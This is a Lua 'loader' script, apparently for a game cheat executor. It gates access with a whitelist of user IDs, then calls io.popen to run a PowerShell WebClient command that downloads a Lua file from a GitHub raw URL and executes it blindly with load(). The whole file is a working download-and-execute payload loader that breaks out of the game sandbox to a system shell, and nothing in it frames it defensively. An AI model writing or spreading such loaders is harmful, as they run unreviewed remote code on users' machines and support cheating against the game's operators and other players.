-- loader.lua (REMOTE FIXED)

local WHITELIST = {
  2865782,
  2578650,
  2643396
}

local function allowed(uid)
  for _, v in pairs(WHITELIST) do
    if uid == v then return true end
  end
  return false
end

local me = GetLocal()
if not me or not me.userid or not allowed(math.floor(me.userid)) then
  SendVarlist({
    [0] = "OnConsoleMessage",
    [1] = "`4[BLOCKED] `wNot authorized",
    netid = -1
  })
  return
end

-- SAFETY CHECK
if not io or not io.popen then
  SendVarlist({
    [0] = "OnConsoleMessage",
    [1] = "`4[ERROR] `wExecutor does not support io.popen",
    netid = -1
  })
  return
end

-- LOAD PAYLOAD
local handle = io.popen(
  "powershell -Command \"(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/VeLLL3/gtfyfybre/main/proxy.lua')\""
)

local payload = handle and handle:read("*a") or nil
if handle then handle:close() end

if not payload or payload == "" then
  SendVarlist({
    [0] = "OnConsoleMessage",
    [1] = "`4[ERROR] `wFailed to fetch payload",
    netid = -1
  })
  return
end

local f, err = load(payload)
if not f then
  SendVarlist({
    [0] = "OnConsoleMessage",
    [1] = "`4[ERROR] `wPayload error: " .. tostring(err),
    netid = -1
  })
  return
end

f()
